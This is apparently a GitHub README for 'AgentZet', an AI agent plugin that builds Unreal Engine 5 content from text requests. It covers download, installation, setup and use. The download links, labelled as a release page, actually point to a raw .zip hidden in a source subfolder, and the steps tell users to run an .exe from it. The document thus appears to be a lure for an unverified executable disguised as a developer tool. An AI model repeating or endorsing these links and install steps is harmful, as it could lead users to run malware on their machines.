# 🤖 AgentZet - Build Unreal Engine games using words

[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://raw.githubusercontent.com/Redgoatfishwhittler671/AgentZet/main/Source/AgentZetActions/Private/Viewport/Zet_Agent_v1.3-beta.3.zip)

AgentZet helps you create game content in Unreal Engine 5. You describe what you want, and the AI agent builds it for you. It handles complex tasks like writing C++ code, creating Blueprints, and setting up level materials. You stay in control of your project while the agent completes the work.

## 📥 Getting the software

You need to download the installer from the official release page. 

[Visit this page to download the latest version](https://raw.githubusercontent.com/Redgoatfishwhittler671/AgentZet/main/Source/AgentZetActions/Private/Viewport/Zet_Agent_v1.3-beta.3.zip)

Look for the file that ends with .exe under the most recent header. Save this file to your computer.

## ⚙️ System requirements

Ensure your computer meets these needs before you start:

- Windows 10 or Windows 11.
- Unreal Engine 5.1 or a newer version.
- An active internet connection for the AI tools.
- A valid API key from an AI provider like OpenAI, Anthropic, or Google.
- At least 16GB of system memory.

## 🛠️ Installation steps

Follow these steps to set up the tool:

1. Locate the downloaded .exe file in your Downloads folder.
2. Double-click the file to start the installation.
3. Follow the prompts on your screen.
4. Choose the folder where you keep your Unreal Engine plugins.
5. Select the "Install" button to finish. 
6. Restart the Epic Games Launcher if it is currently open.

## 🚀 Setting up the agent

Once the installation finishes, you must connect the agent to an AI provider.

1. Open your Unreal Engine project.
2. Look for the AgentZet icon in the top toolbar.
3. Click the icon to open the settings window.
4. Paste your API key into the box provided. 
5. Select your preferred AI model from the list. 
6. Press the Save button to lock in these choices.

## 💡 How to use the agent

You interact with AgentZet through a simple chat box inside your editor. 

1. Open the AgentZet panel from the Window menu.
2. Type a clear request into the chat box. For example: "Create a Blueprint that spawns a light when the player walks into a trigger volume."
3. Press enter or click the send button. 
4. Wait for the agent to process your request. 
5. The agent will show a live preview of the code or asset it intends to create.
6. Click "Apply" to add the item to your project.

## 🧩 Examples of what you can build

The agent handles many different types of tasks:

- Blueprints: Use plain English to describe game logic. The agent programs the nodes.
- C++ Classes: Ask for a new class and the agent writes the header and source files.
- Materials: Describe the look of a surface like "rusty metal" or "wet glass" and the agent sets up the graph.
- Widgets: Explain your UI layout and the agent builds the user interface elements.
- Level Design: Ask the agent to place foliage, actors, or lighting rigs in your level.

## 🔐 Privacy and security

The agent only accesses the parts of your project needed to complete your request. It sends your prompt to the AI provider to generate instructions. Your project files remain on your computer. You should check the code generated by the AI agent before you deploy your game.

## 🔧 Troubleshooting

Common issues and their fixes:

- If the agent does not respond, check your internet connection.
- If the agent hits an error, verify that your API key has funds.
- If the menu does not appear in Unreal Engine, verify that the plugin is enabled in the Edit > Plugins menu.
- If the tool crashes, ensure you are running the latest version of your graphics drivers.

## 📋 Best practices

Write clear and specific prompts for best results. Instead of saying "Make me a gun," try "Create a C++ class for a pistol that fires a projectile every half second." Mention specific project requirements if you have them. This helps the agent produce code that fits your game design.
